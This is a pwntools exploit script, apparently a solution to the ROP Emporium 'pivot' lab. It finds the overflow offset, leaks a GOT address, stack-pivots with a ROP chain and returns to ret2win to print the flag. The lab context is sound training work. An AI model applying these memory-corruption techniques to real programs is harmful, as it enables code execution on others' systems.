#!/bin/usr/python3

from pwn import *
def start():
	p = process("./pivot")
	gdb.attach(p , gdbscript='''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./pivot", checksec=False)
context.log_level = "info"
context.delete_corefiles = True


def find_rip(payload):
    # Launch process and send payload
    p = process("./pivot")
    p.sendlineafter('>', "")  # We need to deal with initial prompt
    # Then we can send payload (when it asks for stack smash)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    rsp = p.corefile.rsp
    pattern = p.corefile.read(rsp, 4)
    rip_offset = cyclic_find(pattern)
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the RIP offset
    return rip_offset

# Pass in pattern_size, get back EIP offset
rip_offset = find_rip(cyclic(100))


#io = start()
p = process()
rop = ROP(elf)

#pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)
pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)

foothold_offset = 0x96a
ret2win_offset = 0xa81
info("foot_hold offset = %#x", foothold_offset)
info("ret2win offset = %#x", ret2win_offset)

rop = ROP(elf)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
info("pop rax; ret; = %#x", pop_rax)

xchg_rax_rsp = elf.symbols.usefulGadgets + 2
info("xchg rax rsp = %#x", xchg_rax_rsp)

rop.call(elf.plt.foothold_function)
rop.call(elf.plt.puts, [elf.got.foothold_function])
rop.call(elf.symbols.main)

info("sending first payload to leak foothold_function@got address")
p.sendline(rop.chain())

payload = rop.chain()

rop = ROP(elf)
rop.raw([pop_rax, pivot_addr, xchg_rax_rsp])

info("sending second payload to stack pivot")
p.sendlineafter(">", flat({rip_offset: rop.chain()}))

payload += flat({
	rip_offset: rop.chain()
})

p.recvuntil("libpivot\n")
leaked_got_address = p.recv()
foothold_leak = unpack(leaked_got_address[:6].ljust(8, b"\x00"))
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)


# Our third (and final) payload to retrieve out flag
p.sendline(flat({rip_offset: ret2win_addr}))

payload += flat({
	rip_offset: ret2win_addr
})

f = open("./payload", "wb")
f.write(payload)
f.close()

p.recvuntil("Thank you!\n")
flag = p.recv()
success(flag)

#while True:
#	tmp = p.recv()
#	info(tmp)

























